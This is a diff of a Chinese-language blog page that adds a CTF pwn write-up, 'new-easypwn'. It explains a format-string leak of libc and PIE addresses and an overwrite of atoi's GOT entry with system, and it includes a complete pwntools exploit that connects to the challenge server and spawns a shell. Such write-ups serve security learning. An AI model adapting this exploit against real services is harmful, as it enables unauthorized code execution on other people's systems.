@@ -403,6 +403,8 @@
         <li><a href="#exp-1">exp</a></li>
       </ul>
     </li>
+    <li><a href="#3-new-easypwnn1">3. new-easypwn<a href="%E6%9C%AA%E5%AE%8C%E6%88%90">N1</a></a></li>
+    <li><a href="#exp-2">exp</a></li>
   </ul>
 </nav>
   </div>
@@ -645,6 +647,96 @@ exp
 </span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;input :&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="3-new-easypwnn1">
+<a class="header-anchor" href="#3-new-easypwnn1"></a>
+3. new-easypwn<a href="%E6%9C%AA%E5%AE%8C%E6%88%90">N1</a>
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nl">Arch:</span>     <span class="nf">amd64</span>
+</span></span><span class="line"><span class="cl"><span class="nl">RELRO:</span>      <span class="nf">Partial</span> <span class="nv">RELRO</span>
+</span></span><span class="line"><span class="cl"><span class="nl">Stack:</span>      <span class="nf">Canary</span> <span class="nv">found</span>
+</span></span><span class="line"><span class="cl"><span class="nl">NX:</span>         <span class="nf">NX</span> <span class="nv">enabled</span>
+</span></span><span class="line"><span class="cl"><span class="nl">PIE:</span>        <span class="nf">PIE</span> <span class="nv">enabled</span>
+</span></span></code></pre></div><p>载入IDA，发现是一个通讯录小程序，对于输入的值执行对应的函数
+<img src="/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/img/image-3.png" alt="alt text"></p>
+<p>查看各个函数功能，不难发现在Show函数中，存在格式化字符串漏洞，可以泄露地址
+<img src="/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/img/image-4.png" alt="alt text">
+可以把要泄露的地址写入ADD函数中</p>
+<p>先查看格式化字符串漏洞输出的地址，可以通过gdb断点printf，一个一个跑
+<img src="/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/img/image-6.png" alt="alt text">
+可以看到第9和第13个地址分别是<code>main + 0x1274</code>的地址和<code>__libc_start_main + 240</code>的地址</p>
+<blockquote>
+<ol>
+<li>为什么从第六开始数？
+因为x64程序前5个参数写入寄存器</li>
+<li>为什么判断第9个地址是main+0x1274？
+因为rbp后的地址为返回地址，就是执行完printf后的返回地址，正好返回了main函数调用函数的地址，再减去1274就是main函数的base_addr</li>
+</ol></blockquote>
+<ol>
+<li>泄露地址</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ADD</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;%13$p %9$p&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;aaaaaaaa&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;15&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;12345678&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Show</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_start_main</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">240</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1274</span>
+</span></span></code></pre></div><ol start="2">
+<li>计算偏移</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">libc_start_main_base</span> <span class="o">=</span> <span class="n">libc_start_main</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbol</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_start_main_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbol</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span></code></pre></div><ol start="3">
+<li>将system函数地址写入atoi@got表</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">atoi_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Edit</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;c&#39;</span> <span class="o">*</span> <span class="mi">11</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;c&#39;</span> <span class="o">*</span> <span class="mi">13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span> <span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+</span></span></code></pre></div><blockquote>
+<p>为什么使用b&rsquo;c&rsquo; * 13 + p64(atoi_got) , p64(system_addr)
+<img src="/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/img/image-7.png" alt="alt text">
+如图所示，将atoi_got的地址写入des_info，然后修改为system_addr，这样atoi_got的地址就被修改为system_addr了</p></blockquote>
+<h2 id="exp-2">
+<a class="header-anchor" href="#exp-2"></a>
+exp
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># r = process(&#34;./hello&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./hello&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc-2.23.so&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;61.147.171.105&#39;</span><span class="p">,</span><span class="mi">61758</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ADD</span><span class="p">(</span><span class="n">number</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">info</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;choice&gt;&gt;&#34;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;number:&#34;</span><span class="p">,</span><span class="n">number</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;name:&#34;</span><span class="p">,</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;size:&#34;</span><span class="p">,</span><span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;info:&#34;</span><span class="p">,</span><span class="n">info</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;choice&gt;&gt;&#34;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;index:&#34;</span><span class="p">,</span><span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">number</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">info</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;choice&gt;&gt;&#34;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;index:&#34;</span><span class="p">,</span><span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;number:&#34;</span><span class="p">,</span><span class="n">number</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;name:&#34;</span><span class="p">,</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;info:&#34;</span><span class="p">,</span><span class="n">info</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ADD</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;%13$p%9$p&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;aaaaaaaa&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;15&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;12345678&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Show</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_start_main</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">240</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">main_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1274</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_start_main_base</span> <span class="o">=</span> <span class="n">libc_start_main</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_start_main_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">atoi_got</span> <span class="o">=</span> <span class="n">main_addr</span> <span class="o">+</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Edit</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;c&#39;</span> <span class="o">*</span> <span class="mi">11</span> <span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;c&#39;</span> <span class="o">*</span> <span class="mi">13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span> <span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&#34;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></div>
       
     </div>
@@ -691,7 +783,7 @@ exp
           
           
             <img
-              data-src="/images/my/14.png"
+              data-src="/images/my/15.png"
               data-sizes="auto"
               alt="JQCTF2025"
               class="lazyload"
@@ -798,7 +890,7 @@ exp
       <div>
         <span class="icon-brush"
           >&nbsp;
-            12.0k
+            12.6k
           </span
         >
         &nbsp;|&nbsp;
@@ -806,7 +898,7 @@ exp
           
           
 
-          00:28
+          00:29
         </span>
       </div>
     
@@ -861,6 +953,8 @@ exp
         <li><a href="#exp-1">exp</a></li>
       </ul>
     </li>
+    <li><a href="#3-new-easypwnn1">3. new-easypwn<a href="%E6%9C%AA%E5%AE%8C%E6%88%90">N1</a></a></li>
+    <li><a href="#exp-2">exp</a></li>
   </ul>
 </nav>
   </div>
